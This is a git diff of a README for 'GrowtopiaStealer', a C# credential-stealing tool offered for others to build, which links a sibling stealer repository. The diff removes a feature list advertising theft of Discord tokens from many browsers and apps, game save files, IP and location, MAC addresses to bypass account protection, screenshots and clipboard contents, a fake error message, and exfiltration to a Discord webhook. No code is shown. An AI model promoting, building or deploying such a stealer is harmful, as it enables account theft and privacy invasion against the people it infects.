@@ -1,17 +1,7 @@
 # GrowtopiaStealer
 GrowtopiaStealer powerful stealer that steals save.dat, mac address, IP information, etc... Written in C#.
 Other Version that stealer: https://github.com/DedSec77/CyberStealer
-## Features:
-- Steal discord tokens from Discord App, DiscordCanary App, DiscordPTB App, Chrome Browser, Chrome Beta Browser,FireFox Browser, Opera Browser, OperaGX Browser, Edge Browser, Yandex Browser, Brave Browser,Vivaldi Browser, Epic Privacy Browser, 360Browser, CocCoc Browser.
-- Steal Username, Machine Name, Operating system, screen metrics, GPU, CPU, RAM, BSSID.
-- Show what softwares on pc for example Discord, Growtopia, Visual Studio.
-- Steal IP, IPv6, Country, City.
-- Steal MAC Address for bypass AAP
-- Steal Growtopia save.dat
-- Send Screenshot
-- Send Clipboard
-- Can send fake error
-- Send to Discord Webhook
+![GrowtopiaStealer](https://user-images.githubusercontent.com/65458800/129677477-b3bdf725-07bc-4506-91db-530da4413608.png)
 ## Setup:
 ![Tutorial](https://user-images.githubusercontent.com/65458800/129596033-3974eb92-e80a-455d-863a-f78238251f73.png)
 And build your solution
